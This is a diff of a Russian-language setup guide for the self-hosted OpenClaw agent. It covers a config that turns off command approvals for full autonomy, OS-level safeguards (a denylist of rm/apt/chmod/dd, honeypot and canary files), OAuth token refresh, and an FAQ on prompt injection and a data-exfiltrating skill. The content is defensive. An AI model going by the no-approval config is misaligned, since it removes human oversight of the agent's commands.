+                        </table>
+
+                        <p><strong>Способ 2 — Через конфиг (постоянно):</strong></p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — отключить elevated-перехват</span>
+                                <button class="copy-btn" data-copy='"tools": {
+  "elevated": {
+    "enabled": false
+  }
+}'>Копировать</button>
+                            </div>
+                            <pre><code>"tools": {
+  "elevated": {
+    "enabled": false
+  }
+}</code></pre>
+                        </div>
+
+                        <p><code>enabled: false</code> — elevated-слой полностью отключён. Все команды (включая sudo, rm, kill) контролируются <strong>только</strong> через exec-approvals.</p>
+
+                        <div class="callout callout-danger">
+                            <span class="callout-icon">&#9940;</span>
+                            <div class="callout-content">
+                                <strong>Отключать elevated — только с дополнительными мерами защиты</strong>
+                                <p>OpenClaw НЕ различает «sudo хороший» и «rm плохой». Если отключить elevated — <code>rm</code>, <code>apt</code>, <code>chmod</code> тоже перестанут блокироваться (если они в allowlist). Отключайте <strong>только</strong> если у вас есть:</p>
+                                <ul>
+                                    <li>Ограниченный sudoers (конкретные команды)</li>
+                                    <li>Egress whitelist (прокси с FilterDefaultDeny)</li>
+                                    <li>Docker sandbox для субагентов</li>
+                                    <li>Denylist опасных команд в системном промпте / AGENTS.md</li>
+                                </ul>
+                                <p>Для большинства пользователей рекомендуется оставить <code>enabled: true</code> (дефолт).</p>
+                            </div>
+                        </div>
+
+                        <h3>Конфигурация полной автономии (от Артура ИИмерсивного)</h3>
+
+                        <p>Автор этого гайда использует максимально автономную конфигурацию. Бот не спрашивает разрешения ни на одну команду — всё контролируется через другие слои защиты.</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — полная автономия</span>
+                                <button class="copy-btn" data-copy='// exec-approvals.json
+{
+  "version": 1,
+  "defaults": {
+    "security": "full",
+    "ask": "off"
+  }
+}
+
+// openclaw.json
+"tools": {
+  "elevated": { "enabled": false }
+},
+"approvals": {
+  "exec": { "enabled": false }
+}'>Копировать</button>
+                            </div>
+                            <pre><code>// exec-approvals.json
+{
+  "version": 1,
+  "defaults": {
+    "security": "full",
+    "ask": "off"
+  }
+}
+
+// openclaw.json
+"tools": {
+  "elevated": { "enabled": false }
+},
+"approvals": {
+  "exec": { "enabled": false }
+}</code></pre>
+                        </div>
+
+                        <p><strong>Почему это работает безопасно:</strong></p>
+
+                        <table class="comparison-table">
+                            <thead><tr><th>Компенсирующий слой</th><th>Что защищает</th></tr></thead>
+                            <tbody>
+                                <tr><td>Telegram allowlist (только владелец)</td><td>Никто чужой не может отправить команду боту</td></tr>
+                                <tr><td>Egress proxy (tinyproxy + FilterDefaultDeny)</td><td>Данные не уйдут на неизвестный сервер</td></tr>
+                                <tr><td>Docker sandbox для субагентов</td><td>Субагенты изолированы в контейнере</td></tr>
+                                <tr><td>Sudoers (ограниченный или полный)</td><td>Контроль на уровне ОС</td></tr>
+                                <tr><td>Denylist в AGENTS.md</td><td>Бот сам спрашивает перед rm, apt, chmod, chown, dd</td></tr>
+                                <tr><td>Сервер одноразовый</td><td>Если что-то сломается — переустановка за 30 минут</td></tr>
+                            </tbody>
+                        </table>
+
+                        <h4>"Умный Бастион" — собственная система безопасности поверх ОС</h4>
+
+                        <p>Встроенные exec-approvals OpenClaw работают на уровне приложения — prompt injection теоретически может их обойти. Поэтому мы построили дополнительную защиту на уровне ОС, которую бот <strong>не контролирует и не может отключить</strong>.</p>
+
+                        <table class="comparison-table">
+                            <thead><tr><th>Механизм</th><th>Что делает</th><th>Как работает</th></tr></thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>Denylist-скрипт</strong></td>
+                                    <td>Перехватывает опасные команды (rm, apt, chmod, chown, dd)</td>
+                                    <td>Shell-обёртка проверяет команду → блокирует + алерт в Telegram через Bot API</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Honeypot-файлы</strong></td>
+                                    <td>Ловушки на несанкционированный доступ</td>
+                                    <td>Файлы <code>backup_keys.txt</code>, <code>secrets.env</code> с поддельными ключами. Чтение = мгновенный алерт</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Детектор аномалий</strong></td>
+                                    <td>Анализ логов на подозрительную активность</td>
+                                    <td>Cron каждый час: >50 exec-команд или >10 sudo за час = алерт</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Canary-файлы</strong></td>
+                                    <td>Контроль целостности конфигов</td>
+                                    <td>SHA256-хеши <code>openclaw.json</code>, <code>exec-approvals.json</code>, <code>filter.txt</code>. Несовпадение = алерт</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Immutable бэкапы</strong></td>
+                                    <td>Эталонные копии конфигов</td>
+                                    <td><code>chattr +i</code> — даже root не может изменить без специальной команды</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Авто-коммиты workspace</strong></td>
+                                    <td>Git-снапшоты рабочей директории</td>
+                                    <td>Cron каждый час → <code>git revert</code> за секунду если что-то сломалось</td>
+                                </tr>
+                            </tbody>
+                        </table>
+
+                        <p><strong>Принцип:</strong> даже если OpenClaw полностью скомпрометирован через prompt injection — обёртки на уровне ОС сработают. Бот не знает об их существовании и не может их отключить.</p>
+
+                        <pre><code>Агент (полная автономия)
+  │
+  ├── AGENTS.md denylist ──────── правила поведения (уровень промпта)
+  ├── exec-denylist-check.sh ──── программный блок + алерт (уровень ОС)
+  ├── Honeypot-файлы ──────────── ловушки на чтение (уровень ОС)
+  ├── Anomaly detector ────────── анализ логов (cron)
+  ├── Canary-check ────────────── хеши конфигов (heartbeat)
+  ├── Immutable бэкапы ────────── chattr +i (уровень FS)
+  ├── Tinyproxy whitelist ─────── фильтр трафика (уровень сети)
+  ├── Git auto-commit ─────────── снапшоты (cron)
+  └── Docker sandbox ──────────── изоляция субагентов (контейнер)
+       └── sudoers ────────────── ограниченный список команд (уровень ОС)</code></pre>
+
+                        <div class="callout callout-info">
+                            <span class="callout-icon">&#128161;</span>
+                            <div class="callout-content">
+                                <strong>Это возможно только с open-source</strong>
+                                <p>Закрытые системы (ChatGPT, Claude.ai) не дают доступа к ОС. Вы не можете поставить honeypot или перехватить команду на уровне файловой системы. Open-source = полный контроль.</p>
+                            </div>
+                        </div>
+
+                        <div class="callout callout-danger">
+                            <span class="callout-icon">&#9940;</span>
+                            <div class="callout-content">
+                                <strong>Не копируйте конфигурацию полной автономии вслепую</strong>
+                                <p><code>security: "full"</code> + <code>ask: "off"</code> = бот выполняет <em>любую</em> команду без вопросов. Это безопасно только при наличии ВСЕХ компенсирующих слоёв: Telegram allowlist, egress proxy, sandbox, "Умный Бастион". Если у вас этого нет — используйте дефолтную конфигурацию из начала секции «Безопасность».</p>
+                            </div>
+                        </div>
+
+                        <h3>OAuth Token Keeper</h3>
+
+                        <p>OAuth-токены (ChatGPT Plus, Google) имеют короткий срок жизни. Если несколько процессов одновременно попытаются обновить протухший токен — race condition: один использует refresh token, второй получает ошибку, авторизация рвётся.</p>
+
+                        <p><strong>Решение:</strong> cron-скрипт каждые 20 минут проактивно обновляет токены <em>до</em> того, как они протухнут:</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>Cron — token keeper</span>
+                                <button class="copy-btn" data-copy="*/20 * * * * /usr/bin/python3 /usr/local/bin/oauth-token-keeper.py >> /var/log/oauth-token-keeper.log 2>&1">Копировать</button>
+                            </div>
+                            <pre><code>*/20 * * * * /usr/bin/python3 /usr/local/bin/oauth-token-keeper.py >> /var/log/oauth-token-keeper.log 2>&1</code></pre>
+                        </div>
+
+                        <p><strong>Как это работает:</strong></p>
+                        <ol>
+                            <li>Читает <code>auth-profiles.json</code> (файл с OAuth-токенами, отдельный от <code>openclaw.json</code>)</li>
+                            <li>Для каждого провайдера проверяет: до истечения токена < 15 мин?</li>
+                            <li>Если да — обновляет через API провайдера <em>проактивно</em></li>
+                            <li>Использует <code>flock</code> — только один процесс обновляет одновременно (решает race condition)</li>
+                            <li>Атомарная запись (tempfile + rename) — никогда не повредит файл</li>
+                            <li>Шлёт <code>kill -USR1</code> gateway для перечитывания</li>
+                        </ol>
+
+                        <p><strong>Ключевая идея:</strong> токен обновляется ДО того, как протухнет. Gateway и субагенты всегда видят свежий токен → race condition невозможен.</p>
+
+                        <div class="callout callout-info">
+                            <span class="callout-icon">&#128161;</span>
+                            <div class="callout-content">
+                                <strong>Если OAuth всё равно сломался</strong>
+                                <p>В логе <code>/var/log/oauth-token-keeper.log</code> видно <code>REFRESH FAILED</code> → нужен re-login: <code>openclaw models auth login --provider &lt;провайдер&gt;</code>. Запускать от пользователя OpenClaw (не root), иначе файл сохранится с неправильными правами.</p>
+                            </div>
+                        </div>
+
+                        <h3>Ротация логов</h3>
+
+                        <p>Без ротации логи OpenClaw растут бесконечно и могут забить диск. Logrotate — стандартный инструмент Linux для автоматической ротации:</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>/etc/logrotate.d/openclaw</span>
+                                <button class="copy-btn" data-copy="/tmp/openclaw/openclaw-*.log {
+    daily
+    rotate 7
+    compress
+    delaycompress
+    missingok
+    notifempty
+    copytruncate
+    size 50M
+}">Копировать</button>
+                            </div>
+                            <pre><code>/tmp/openclaw/openclaw-*.log {
+    daily
+    rotate 7
+    compress
+    delaycompress
+    missingok
+    notifempty
+    copytruncate
+    size 50M
+}</code></pre>
+                        </div>
+
+                        <table class="comparison-table">
+                            <thead><tr><th>Параметр</th><th>Что делает</th></tr></thead>
+                            <tbody>
+                                <tr><td><code>daily</code></td><td>Ротация раз в день</td></tr>
+                                <tr><td><code>rotate 7</code></td><td>Хранить последние 7 файлов</td></tr>
+                                <tr><td><code>compress</code></td><td>Сжимать старые логи gzip</td></tr>
+                                <tr><td><code>copytruncate</code></td><td>Не перезапускать gateway — копирует и обрезает файл на лету</td></tr>
+                                <tr><td><code>size 50M</code></td><td>Ротировать если файл > 50 МБ (даже если не прошёл день)</td></tr>
+                            </tbody>
+                        </table>
+
+                    </div>
+                </details>
+
+                <!-- ==================== 9. AGENTS ==================== -->
+                <details class="guide-section" id="agents-section">
+                    <summary><h2 id="agents">Субагенты и оркестрация</h2></summary>
+                    <div class="section-content">
+
+                        <p>Opus — главный координатор. Он получает задачу и выбирает, какую модель запустить как субагент:</p>
+
+                        <pre><code>┌─────────────────────────────────────────────────┐
+│  Opus (primary) — координирует всё              │
+│                                                 │
+│  Получает задачу → выбирает модель → spawn      │
+├─────────────────────────────────────────────────┤
+│                                                 │
+│  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │
+│  │  codex   │  │  gpt54   │  │   gemini     │  │
+│  │ gpt-5.3  │  │ gpt-5.4  │  │ gemini-3-pro │  │
+│  │          │  │          │  │              │  │
+│  │ Код,     │  │ Ревью,   │  │ Big context  │  │
+│  │ скрипты  │  │ план     │  │ (2M)         │  │
+│  └──────────┘  └──────────┘  └──────────────┘  │
+│                                                 │
+│  ┌──────────┐  Heartbeat: flash (55 мин)        │
+│  │  flash   │                                   │
+│  │ gem-2.5  │  Дефолт для субагентов             │
+│  │ Простые  │                                   │
+│  └──────────┘                                   │
+└─────────────────────────────────────────────────┘</code></pre>
+
+                        <h3>Конфигурация</h3>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — agents</span>
+                                <button class="copy-btn" data-copy='"agents": {
+  "defaults": {
+    "subagents": {
+      "maxConcurrent": 8,
+      "model": "google/gemini-2.5-flash"
+    },
+    "heartbeat": {
+      "every": "55m",
+      "model": "google/gemini-2.5-flash"
+    }
+  },
+  "list": [
+    {
+      "id": "main",
+      "name": "Main",
+      "tools": { "profile": "coding" }
+    }
+  ]
+}'>Копировать</button>
+                            </div>
+                            <pre><code>"agents": {
+  "defaults": {
+    "subagents": {
+      "maxConcurrent": 8,
+      "model": "google/gemini-2.5-flash"
+    },
+    "heartbeat": {
+      "every": "55m",
+      "model": "google/gemini-2.5-flash"
+    }
+  },
+  "list": [
+    {
+      "id": "main",
+      "name": "Main",
+      "tools": { "profile": "coding" }
+    }
+  ]
+}</code></pre>
+                        </div>
+
+                        <h3>Правила выбора модели при spawn</h3>
+
+                        <table class="comparison-table">
+                            <thead><tr><th>Задача</th><th>Модель</th><th>Почему</th></tr></thead>
+                            <tbody>
+                                <tr><td>Код, скрипты, дебаг</td><td><code>codex</code></td><td>Заточена под код (Codex-серия)</td></tr>
+                                <tr><td>Ревью, план, архитектура</td><td><code>gpt54</code></td><td>Сильное рассуждение</td></tr>
+                                <tr><td>Большой текст (>100K)</td><td><code>gemini</code></td><td>2M контекст</td></tr>
+                                <tr><td>Простой поиск / суммаризация</td><td><code>flash</code> (дефолт)</td><td>Быстрая, API key, стабильная</td></tr>
+                                <tr><td>Критично важное решение</td><td><code>opus</code></td><td>Самая умная, но дорогая</td></tr>
+                            </tbody>
+                        </table>
+
+                        <p><strong>Почему один агент:</strong> проще. Opus координирует и выбирает модель для каждого субагента по задаче. Дефолтная модель субагентов — flash (API key, бессрочный, стабильный).</p>
+
+                    </div>
+                </details>
+
+                <!-- ==================== 10. FAQ ==================== -->
+                <details class="guide-section" id="faq-section">
+                    <summary><h2 id="faq">Частые вопросы</h2></summary>
+                    <div class="section-content">
+
+                        <details class="faq-item">
+                            <summary>Бот не отвечает в Telegram</summary>
+                            <div>
+                                <p>Проверьте по порядку:</p>
+                                <ol>
+                                    <li><code>openclaw status</code> — gateway запущен?</li>
+                                    <li>Токен бота правильный? Проверьте в конфиге</li>
+                                    <li><code>openclaw doctor</code> — диагностика проблем</li>
+                                    <li>Если бот умирает при закрытии SSH: <code>loginctl enable-linger ЮЗЕР</code></li>
+                                </ol>
+                            </div>
+                        </details>
+
+                        <details class="faq-item">
+                            <summary>Ошибка «Invalid API key»</summary>
+                            <div>
+                                <p>API-ключ мог протухнуть или быть введён неправильно. Проверьте:</p>
+                                <ul>
+                                    <li><code>openclaw models status</code> — статус всех моделей</li>
+                                    <li>Для OAuth: проверьте лог <code>/var/log/oauth-token-keeper.log</code></li>
+                                    <li>Для setup-token: перегенерируйте через <code>claude setup-token</code></li>
+                                </ul>
+                            </div>
+                        </details>
+
+                        <details class="faq-item">
+                            <summary>Как обновить OpenClaw?</summary>
+                            <div>
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span>Terminal</span>
+                                        <button class="copy-btn" data-copy="openclaw update
+# или через npm:
+npm update -g openclaw">Копировать</button>
+                                    </div>
+                                    <pre><code>openclaw update
+# или через npm:
+npm update -g openclaw</code></pre>
                                 </div>
-                                <pre><code>sudo loginctl enable-linger openuser</code></pre>
+                                <p>После обновления: <code>systemctl restart openclaw-gateway</code></p>
                             </div>
-                            <p>Эта команда говорит системе: «Этот пользователь — особенный. Не трогай его процессы, даже когда он ушёл». После этого бот будет жить 24/7.</p>
-                            <p>Хочешь убедиться, что сработало? Проверь: <code>loginctl show-user openuser | grep Linger</code> — должно быть <code>Linger=yes</code>.</p>
-                        </div>
-                    </details>
+                        </details>
 
-                    <details class="faq-item">
-                        <summary>Что такое Fail2Ban и зачем он нужен?</summary>
-                        <div>
-                            <p>Fail2Ban — это «охранник», который следит за попытками входа на сервер. Если кто-то пытается подобрать пароль (перебирает варианты), Fail2Ban автоматически блокирует его IP-адрес. Это защита от брутфорс-атак.</p>
-                            <p>Проверить статус: <code>sudo systemctl status fail2ban</code></p>
-                        </div>
-                    </details>
-
-                    <details class="faq-item">
-                        <summary>Что такое Sandbox (песочница)?</summary>
-                        <div>
-                            <p>Sandbox — это изолированная среда, в которой работает OpenClaw. Даже если AI попытается выполнить опасную команду, он не сможет повредить основную систему.</p>
-                            <p>Режимы:</p>
-                            <ul>
-                                <li><code>off</code> — без изоляции (опасно)</li>
-                                <li><code>non-main</code> — изолированы только групповые чаты</li>
-                                <li><code>all</code> — полная изоляция в Docker (рекомендуется)</li>
-                            </ul>
-                        </div>
-                    </details>
-
-                    <details class="faq-item">
-                        <summary>Зачем нужен Tailscale?</summary>
-                        <div>
-                            <p>Tailscale создаёт защищённый VPN-туннель между твоими устройствами. Это позволяет получить доступ к OpenClaw с телефона или другого компьютера без открытия портов в интернет.</p>
-                            <p>Преимущества:</p>
-                            <ul>
-                                <li>Не нужно открывать порты в firewall</li>
-                                <li>Шифрованное соединение</li>
-                                <li>Работает через NAT</li>
-                                <li>Бесплатно для личного использования</li>
-                            </ul>
-                        </div>
-                    </details>
-
-                    <details class="faq-item">
-                        <summary>Как проверить, что всё настроено правильно?</summary>
-                        <div>
-                            <p>Запусти встроенный аудит:</p>
-                            <div class="code-block">
-                                <pre><code>openclaw security audit --deep</code></pre>
+                        <details class="faq-item">
+                            <summary>Что такое Sandbox и зачем он нужен?</summary>
+                            <div>
+                                <p>Sandbox — изолированная среда (Docker-контейнер) с ограничениями по RAM, CPU и сети.</p>
+                                <ul>
+                                    <li><code>"off"</code> — без sandbox (всё на хосте)</li>
+                                    <li><code>"non-main"</code> — субагенты в sandbox, main на хосте <strong>(рекомендуется)</strong></li>
+                                    <li><code>"all"</code> — всё в sandbox (сломает доступ к инструментам хоста)</li>
+                                </ul>
                             </div>
-                            <p>Также проверь:</p>
-                            <div class="code-block">
-                                <pre><code>openclaw doctor</code></pre>
-                            </div>
-                            <p>Эти команды покажут потенциальные проблемы и предложат исправления.</p>
-                        </div>
-                    </details>
+                        </details>
 
-                    <details class="faq-item">
-                        <summary>OpenClaw на Windows — почему нужен WSL2?</summary>
-                        <div>
-                            <p>OpenClaw разработан для Linux/macOS. На Windows он работает только через WSL2 (Windows Subsystem for Linux) — это встроенная виртуальная машина с Ubuntu.</p>
-                            <p>Установка WSL2:</p>
-                            <div class="code-block">
-                                <pre><code>wsl --install</code></pre>
+                        <details class="faq-item">
+                            <summary>Безопасно ли давать боту доступ к компьютеру?</summary>
+                            <div>
+                                <p>OpenClaw работает <strong>локально</strong> на вашем сервере. Данные не уходят никуда, кроме API провайдера модели. Но:</p>
+                                <ul>
+                                    <li>Сторонние скиллы могут быть опасны — Cisco нашла data exfiltration в одном из них</li>
+                                    <li>Prompt injection через Telegram — кто-то может попытаться «уговорить» бота выполнить вредоносную команду</li>
+                                    <li>Telegram allowlist + exec-approvals = два обязательных уровня защиты</li>
+                                </ul>
                             </div>
-                            <p>После перезагрузки выполняй все команды OpenClaw внутри WSL.</p>
-                        </div>
-                    </details>
-                </section>
+                        </details>
+
+                        <details class="faq-item">
+                            <summary>OpenClaw на Windows — почему WSL2?</summary>
+                            <div>
+                                <p>OpenClaw нативно работает только на macOS и Linux. Windows не поддерживается напрямую — нужен WSL2 (Windows Subsystem for Linux), который создаёт полноценную Linux-среду внутри Windows.</p>
+                                <p>Установка: <code>wsl --install</code> в PowerShell от администратора → перезагрузка → работаете внутри Ubuntu.</p>
+                            </div>
+                        </details>
+
+                        <details class="faq-item">
+                            <summary>«API rate limit reached» — что делать?</summary>
+                            <div>
+                                <p>Часто это <strong>не rate limit</strong>, а 401 ошибка авторизации — вводящее в заблуждение сообщение. OAuth-токен протух и не смог обновиться (race condition).</p>
+                                <p><strong>Решение:</strong> re-login через <code>openclaw models auth login --provider &lt;провайдер&gt;</code>. Для предотвращения: настройте OAuth Token Keeper (см. секцию «Автономность»).</p>
+                            </div>
+                        </details>
+
+                        <details class="faq-item">
+                            <summary>Как проверить, что конфиг валиден?</summary>
+                            <div>
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span>Terminal</span>
+                                        <button class="copy-btn" data-copy="openclaw config validate">Копировать</button>
+                                    </div>
+                                    <pre><code>openclaw config validate</code></pre>
+                                </div>
+                                <p><strong>Важно:</strong> невалидный конфиг = crash-loop gateway. Всегда валидируйте перед hot-reload.</p>
+                            </div>
+                        </details>
+
+                        <details class="faq-item">
+                            <summary>Gateway зависает или падает — что делать?</summary>
+                            <div>
+                                <ol>
+                                    <li>Проверьте логи: <code>tail -50 /tmp/openclaw/openclaw-$(date +%Y-%m-%d).log</code></li>
+                                    <li>Проверьте процесс: <code>ps aux | grep openclaw-gateway</code></li>
+                                    <li>Перезапуск: <code>systemctl restart openclaw-gateway</code></li>
+                                    <li>Если crash-loop — валидируйте конфиг: <code>openclaw config validate</code></li>
+                                </ol>
+                                <p>Частая причина: невалидный JSON в <code>openclaw.json</code> после ручной правки. Всегда делайте бекап перед изменениями.</p>
+                            </div>
+                        </details>
+
+                        <details class="faq-item">
+                            <summary>Как сделать backup памяти и конфигов?</summary>
+                            <div>
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span>Terminal</span>
+                                        <button class="copy-btn" data-copy="# Backup всего workspace + конфигов
+tar czf openclaw-backup-$(date +%Y%m%d).tar.gz \
+  ~/.openclaw/openclaw.json \
+  ~/.openclaw/exec-approvals.json \
+  ~/.openclaw/workspace/ \
+  ~/.openclaw/memory/">Копировать</button>
+                                    </div>
+                                    <pre><code># Backup всего workspace + конфигов
+tar czf openclaw-backup-$(date +%Y%m%d).tar.gz \
+  ~/.openclaw/openclaw.json \
+  ~/.openclaw/exec-approvals.json \
+  ~/.openclaw/workspace/ \
+  ~/.openclaw/memory/</code></pre>
+                                </div>
+                                <p>Можно автоматизировать через cron (раз в день) или через workspace-autocommit скрипт с git.</p>
+                            </div>
+                        </details>
+
+                        <details class="faq-item">
+                            <summary>Безопасно ли устанавливать сторонние скиллы?</summary>
+                            <div>
+                                <p><strong>Не всегда.</strong> Cisco обнаружила data exfiltration в стороннем скилле — он отправлял данные на внешний сервер без ведома пользователя.</p>
+                                <p>Правила:</p>
+                                <ul>
+                                    <li>Устанавливайте скиллы только из официального <a href="https://clawhub.com" target="_blank">ClawhHub</a> или проверенных источников</li>
+                                    <li>Читайте код скилла перед установкой (они open-source)</li>
+                                    <li>Egress whitelist защитит даже от вредоносного скилла — данные не уйдут на неизвестный домен</li>
+                                    <li><code>autoAllowSkills: false</code> в exec-approvals — скиллы будут запрашивать разрешение</li>
+                                </ul>
+                            </div>
+                        </details>
+
+                        <details class="faq-item">
+                            <summary>Бот медленно отвечает — как ускорить?</summary>
+                            <div>
+                                <p>Частые причины:</p>
+                                <ul>
+                                    <li><strong>Переполнение контекста</strong> — длинная сессия съедает всё окно модели. Решение: <code>/new</code> (новая сессия)</li>
+                                    <li><strong>Искусственные паузы</strong> — отключите: <code>"humanDelay": {"mode": "off"}</code></li>
+                                    <li><strong>Prompt cache протух</strong> — проверьте heartbeat (должен быть < 60 мин). См. секцию «Токены»</li>
+                                    <li><strong>Модель перегружена</strong> — переключитесь на fallback: <code>/model flash</code></li>
+                                </ul>
+                            </div>
+                        </details>
+
+                        <details class="faq-item">
+                            <summary>Где хранятся API-ключи и как их защитить?</summary>
+                            <div>
+                                <p>API-ключи хранятся в <strong>отдельном файле</strong> <code>auth-profiles.json</code>, а не в <code>openclaw.json</code>. Это разделение позволяет безопасно делиться конфигом без утечки ключей.</p>
+                                <ul>
+                                    <li>Файл: <code>~/.openclaw/agents/main/agent/auth-profiles.json</code></li>
+                                    <li>Права: <code>chmod 600 auth-profiles.json</code> (только владелец читает)</li>
+                                    <li>Никогда не коммитьте этот файл в git</li>
+                                    <li>Переменные окружения: <code>~/.openclaw/.env</code> (читается автоматически)</li>
+                                </ul>
+                            </div>
+                        </details>
+
+                    </div>
+                </details>
 
                 <!-- Related Guides -->
                 <section class="related-guides">
@@ -1173,6 +1833,14 @@ sudo apt install -y nodejs</code></pre>
                         <a href="../oauth/google.html" class="related-card">
                             <h4>Google OAuth</h4>
                             <p>Настройка авторизации для интеграций</p>
+                        </a>
+                        <a href="../api-keys/anthropic.html" class="related-card">
+                            <h4>Claude (Anthropic) API</h4>
+                            <p>Получение API-ключа и настройка биллинга</p>
+                        </a>
+                        <a href="../api-keys/openai.html" class="related-card">
+                            <h4>OpenAI API</h4>
+                            <p>API-ключ для GPT-моделей</p>
                         </a>
                     </div>
                 </section>
